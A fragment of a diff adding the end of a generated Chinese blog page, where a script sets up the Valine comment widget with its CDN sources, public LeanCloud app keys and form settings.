+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
